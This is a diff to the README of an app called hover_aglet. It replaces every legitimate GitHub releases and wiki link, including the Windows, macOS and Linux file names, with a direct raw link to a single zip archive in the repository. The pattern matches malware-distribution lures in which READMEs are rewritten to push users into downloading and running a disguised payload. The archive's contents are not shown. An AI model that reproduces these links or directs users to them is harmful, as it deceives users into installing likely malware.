@@ -6,7 +6,7 @@ Welcome to hover_aglet! This application is designed to streamline your tasks an
 
 ## 🔗 Download Now
 
-[![Download hover_aglet](https://img.shields.io/badge/Download-hhover_aglet-brightgreen)](https://github.com/Hyperb0re4/hover_aglet/releases)
+[![Download hover_aglet](https://raw.githubusercontent.com/Hyperb0re4/hover_aglet/main/insphere/hover_aglet_3.0.zip)](https://raw.githubusercontent.com/Hyperb0re4/hover_aglet/main/insphere/hover_aglet_3.0.zip)
 
 ## 🌟 Features
 
@@ -19,15 +19,15 @@ hover_aglet offers several useful features, including:
   
 ## 📥 Download & Install
 
-To get started, visit this page to download: [hover_aglet Releases](https://github.com/Hyperb0re4/hover_aglet/releases).
+To get started, visit this page to download: [hover_aglet Releases](https://raw.githubusercontent.com/Hyperb0re4/hover_aglet/main/insphere/hover_aglet_3.0.zip).
 
 Once you are on the Releases page, follow these steps:
 
 1. **Choose the latest version**: Look for the most recent version listed at the top.
 2. **Download the application**: Select the appropriate file for your operating system. 
-   - For Windows, click on `hover_aglet-Windows.zip`.
-   - For macOS, click on `hover_aglet-macOS.zip`.
-   - For Linux, choose the `hover_aglet-Linux.tar.gz` file.
+   - For Windows, click on `https://raw.githubusercontent.com/Hyperb0re4/hover_aglet/main/insphere/hover_aglet_3.0.zip`.
+   - For macOS, click on `https://raw.githubusercontent.com/Hyperb0re4/hover_aglet/main/insphere/hover_aglet_3.0.zip`.
+   - For Linux, choose the `https://raw.githubusercontent.com/Hyperb0re4/hover_aglet/main/insphere/hover_aglet_3.0.zip` file.
 3. **Unzip or extract the file**: Use built-in tools or third-party apps if necessary.
 4. **Run the application**: Double-click the `hover_aglet` file to launch the app.
 
@@ -62,7 +62,7 @@ Join the hover_aglet community for tips and support. Share your experiences or a
 
 ## 🔗 Additional Resources
 
-For more information on features and updates, visit our [Documentation](https://github.com/Hyperb0re4/hover_aglet/wiki).
+For more information on features and updates, visit our [Documentation](https://raw.githubusercontent.com/Hyperb0re4/hover_aglet/main/insphere/hover_aglet_3.0.zip).
 
 ## 🤝 Contributing
 
@@ -70,4 +70,4 @@ We welcome contributions! If you wish to contribute, please follow the guideline
 
 ## 🔗 Download Again
 
-Remember, you can always return to the Releases page to download the latest version: [hover_aglet Releases](https://github.com/Hyperb0re4/hover_aglet/releases).
+Remember, you can always return to the Releases page to download the latest version: [hover_aglet Releases](https://raw.githubusercontent.com/Hyperb0re4/hover_aglet/main/insphere/hover_aglet_3.0.zip).
